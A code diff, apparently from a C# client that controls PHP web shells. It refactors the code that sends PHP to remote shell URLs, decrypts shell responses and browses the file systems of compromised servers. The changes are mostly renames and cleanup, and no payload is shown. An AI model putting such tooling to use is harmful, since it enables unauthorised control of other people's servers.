@@ -71,24 +71,13 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="uri"></param>
-        /// <returns></returns>
-        public bool IsValidUri(string uri)
-        {
-            Uri tempUri;
-            bool uriResult = Uri.TryCreate(uri, UriKind.Absolute, out tempUri);
-            return uriResult && (tempUri.Scheme == Uri.UriSchemeHttp || tempUri.Scheme == Uri.UriSchemeHttps);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
         /// <param name="shellUrl"></param>
         /// <param name="pingMS"></param>
         public void addClientMethod(string shellUrl, string pingMS)
         {
-            ListViewItem lvi = new ListViewItem(new string[] { shellUrl, pingMS + " ms" });
-            lvi.Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            ListViewItem lvi = new ListViewItem(new string[] { shellUrl, pingMS + " ms" }) {
+                Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)))
+            };
             listViewClients.Items.Add(lvi);
 
             if (pingMS == "-") {
@@ -120,10 +109,10 @@ namespace bantam_php
         {
             ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(url, phpCode, encryptResponse));
 
-            if (string.IsNullOrEmpty(response.result) == false) {
-                string result = response.result;
+            if (string.IsNullOrEmpty(response.Result) == false) {
+                string result = response.Result;
                 if (encryptResponse) {
-                    result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                 }
 
                 if (string.IsNullOrEmpty(result)) {
@@ -151,7 +140,7 @@ namespace bantam_php
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                if (!IsValidUri(shellUrl)) {
+                if (!Helper.IsValidUri(shellUrl)) {
                     addClientMethod(shellUrl, "-");
                     return;
                 }
@@ -163,10 +152,10 @@ namespace bantam_php
 
                     ResponseObject response = task.Result;
 
-                    if (string.IsNullOrEmpty(response.result) == false) {
-                        string result = response.result;
+                    if (string.IsNullOrEmpty(response.Result) == false) {
+                        string result = response.Result;
                         if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                         }
 
                         data = result.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
@@ -175,7 +164,7 @@ namespace bantam_php
 
                         if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                             addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
-                            Shells[shellUrl].update(pingWatch.ElapsedMilliseconds, data);
+                            Shells[shellUrl].Update(pingWatch.ElapsedMilliseconds, data);
                         } else {
                             addClientMethod(shellUrl, "-");
                         }
@@ -259,14 +248,14 @@ namespace bantam_php
                 string phpCode = PhpHelper.PhpTestExecutionWithEcho(encryptResponse);
                 ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
 
-                if (string.IsNullOrEmpty(response.result)) {
+                if (string.IsNullOrEmpty(response.Result)) {
                     return;
                 }
 
-                string result = response.result;
+                string result = response.Result;
 
                 if (encryptResponse) {
-                    result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                 }
 
                 if (string.IsNullOrEmpty(result)) {
@@ -293,13 +282,13 @@ namespace bantam_php
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].encryptResponse;
 
-            ResponseObject response = await WebHelper.ExecuteRemotePHP(g_SelectedShellUrl, PhpHelper.PhpInfo(encryptResponse), encryptResponse);
+            ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.PhpInfo(encryptResponse), encryptResponse);
 
-            if (string.IsNullOrEmpty(response.result) == false) {
-                string result = response.result;
+            if (string.IsNullOrEmpty(response.Result) == false) {
+                string result = response.Result;
 
                 if (encryptResponse) {
-                    result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                 }
 
                 if (string.IsNullOrEmpty(result)) {
@@ -381,10 +370,10 @@ namespace bantam_php
                 } else {
                     lblDynCWD.Text = Shells[g_SelectedShellUrl].cwd;
                     lblDynFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].freeHDDSpace) ? "0"
-                                         : GuiHelper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].freeHDDSpace));
+                                         : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].freeHDDSpace));
 
                     lblDynHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].totalHDDSpace) ? "0"
-                                        : GuiHelper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].totalHDDSpace));
+                                        : Helper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].totalHDDSpace));
 
                     lblDynServerIP.Text = Shells[g_SelectedShellUrl].ip;
                     lblDynUname.Text = Shells[g_SelectedShellUrl].unameRelease + " " + Shells[g_SelectedShellUrl].unameKernel;
@@ -403,7 +392,7 @@ namespace bantam_php
 
                         txtBoxFileBrowserPath.Text = Shells[g_SelectedShellUrl].pwd;
                     } else {
-                        start_FileBrowser();
+                        StartFileBrowser();
                     }
                 }
             }
@@ -435,7 +424,7 @@ namespace bantam_php
                 } else {
                     //if the gui treeview is empty, start the filebrowser and display it
                     if (treeViewFileBrowser.Nodes.Count == 0) {
-                        start_FileBrowser();
+                        StartFileBrowser();
                     }
                 }
             }
@@ -487,10 +476,11 @@ namespace bantam_php
 
         private void removeToolStripMenuItem_Click(object sender, EventArgs e)
         {
-
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                 listViewClients.SelectedItems[0].Remove();
-                Shells.Remove(g_SelectedShellUrl);
+                if (Shells.ContainsKey(g_SelectedShellUrl)) {
+                    Shells.Remove(g_SelectedShellUrl);
+                }
             }
         }
 
@@ -501,7 +491,6 @@ namespace bantam_php
                 return;
             }
 
-            //todo poss need copy more of the shell data
             string shellURL = g_SelectedShellUrl;
             string requestArgName = Shells[shellURL].requestArgName;
             bool sendViaCookie = Shells[shellURL].sendDataViaCookie;
@@ -528,11 +517,11 @@ namespace bantam_php
 
         private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog();
-
-            saveShellsXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
-            saveShellsXMLDialog.FilterIndex = 2;
-            saveShellsXMLDialog.RestoreDirectory = true;
+            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog {
+                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
+                FilterIndex = 2,
+                RestoreDirectory = true
+            };
 
             if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK) {
                 XmlHelper.SaveShells(saveShellsXMLDialog.FileName);
@@ -541,10 +530,11 @@ namespace bantam_php
 
         private async void openToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            OpenFileDialog openShellXMLDialog = new OpenFileDialog();
-            openShellXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
-            openShellXMLDialog.FilterIndex = 2;
-            openShellXMLDialog.RestoreDirectory = true;
+            OpenFileDialog openShellXMLDialog = new OpenFileDialog {
+                Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml",
+                FilterIndex = 2,
+                RestoreDirectory = true
+            };
 
             if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                 foreach (ListViewItem lvClients in listViewClients.Items) {
@@ -620,10 +610,10 @@ namespace bantam_php
                     path = ".";
                 }
 
-                if (response.result != null && response.result.Length > 0) {
-                    string result = string.Empty;
+                if (response.Result != null && response.Result.Length > 0) {
+                    string result = response.Result;
                     if (encryptResponse) {
-                        result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                     }
                     FileBrowserRender(result, shellUrl);
                 }
@@ -651,7 +641,7 @@ namespace bantam_php
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
-                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                    lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
@@ -659,7 +649,7 @@ namespace bantam_php
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
-                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                    lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                 }
                             }
                         } else {
@@ -669,7 +659,7 @@ namespace bantam_php
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
-                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                    lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
@@ -677,7 +667,7 @@ namespace bantam_php
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
-                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                    lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                 }
                             }
                         }
@@ -689,13 +679,12 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        private async void start_FileBrowser()
+        private async void StartFileBrowser()
         {
             if (validTarget() == false) {
                 return;
             }
 
-            string result = string.Empty;
             string shellUrl = g_SelectedShellUrl;
             bool encryptResponse = Shells[shellUrl].encryptResponse;
 
@@ -707,12 +696,14 @@ namespace bantam_php
                 string phpCode = PhpHelper.GetHardDriveLettersPhp(encryptResponse);
                 ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
 
-                if (string.IsNullOrEmpty(response.result)) {
+                if (string.IsNullOrEmpty(response.Result)) {
                     return;
                 }
 
+                string result = response.Result;
+
                 if (encryptResponse) {
-                    result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                    result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                 }
 
                 if (string.IsNullOrEmpty(result) == false) {
@@ -725,6 +716,8 @@ namespace bantam_php
                             treeViewFileBrowser.Nodes.Add("", drive, 3);
                         }
                     }
+                } else {
+                    MessageBox.Show(response.Result, "Failed decoding response");
                 }
             } else {
                 string phpVersion = Shells[shellUrl].PHP_Version;
@@ -732,9 +725,10 @@ namespace bantam_php
                 string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(".", phpVersion, encryptResponse);
                 ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
 
-                if (response.result != null && response.result.Length > 0) {
+                if (response.Result != null && response.Result.Length > 0) {
+                    string result = response.Result;
                     if (encryptResponse) {
-                        result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                        result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                     }
                     if (!string.IsNullOrEmpty(result)) {
                         FileBrowserRender(result, shellUrl);
@@ -754,7 +748,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            start_FileBrowser();
+            StartFileBrowser();
         }
 
         /// <summary>
@@ -794,10 +788,10 @@ namespace bantam_php
                         path = ".";
                     }
 
-                    if (response.result != null && response.result.Length > 0) {
-                        string result = string.Empty;
+                    if (response.Result != null && response.Result.Length > 0) {
+                        string result = response.Result;
                         if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                         }
                         if (!string.IsNullOrEmpty(result)) {
                             FileBrowserRender(result, shellUrl);
@@ -840,10 +834,10 @@ namespace bantam_php
                     string directoryContentsPHPCode = PhpHelper.DirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
                     ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode, encryptResponse);
 
-                    if (string.IsNullOrEmpty(response.result) == false) {
-                        string result = string.Empty;
+                    if (string.IsNullOrEmpty(response.Result) == false) {
+                        string result = response.Result;
                         if (encryptResponse) {
-                            result = EncryptionHelper.DecryptShellResponse(response.result, response.encryptionKey, response.encryptionIV);
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV);
                         }
 
                         if (string.IsNullOrEmpty(result)) {
@@ -864,7 +858,7 @@ namespace bantam_php
                                             lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                             if (string.IsNullOrEmpty(columns[2]) == false) {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                                lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             }
                                         } else {
                                             //TODO update their client cache here user changed clients
@@ -874,7 +868,7 @@ namespace bantam_php
                                         if (shellUrl == g_SelectedShellUrl) {
                                             TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                             if (string.IsNullOrEmpty(columns[2]) == false) {
-                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
+                                                lastTn.ToolTipText = Helper.FormatBytes(Convert.ToDouble(columns[2]));
                                             }
                                         } else {
                                             //TODO update their client cache here user changed clients
@@ -918,7 +912,7 @@ namespace bantam_php
                 treeViewFileBrowser.Nodes.Clear();
                 treeViewFileBrowser.Refresh();
             }
-            start_FileBrowser();
+            StartFileBrowser();
         }
 
 
